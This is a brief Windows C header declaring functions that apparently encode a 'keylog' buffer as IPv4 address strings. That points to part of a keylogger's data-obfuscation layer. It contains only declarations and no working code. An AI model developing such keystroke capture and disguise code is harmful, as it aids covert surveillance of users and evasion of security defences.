#ifndef OBFUSCATION_H
#define OBFUSCATION_H

#include <Windows.h>


char* GenerateIpv4(int a, int b, int c, int d);
BOOL GenerateIpv4Output(unsigned char* pKeylog, SIZE_T KeylogSize);

#endif
